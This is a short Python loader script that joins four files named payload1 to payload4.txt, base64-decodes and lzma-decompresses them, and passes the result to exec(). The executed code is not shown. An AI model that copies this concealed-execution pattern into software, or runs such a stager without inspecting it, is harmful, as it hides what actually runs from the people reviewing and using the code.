import os,lzma,base64
from pathlib import Path
base=Path(__file__).parent
payload=''.join((base/f'payload{i}.txt').read_text().strip() for i in range(1,5))
exec(lzma.decompress(base64.b64decode(payload)).decode())
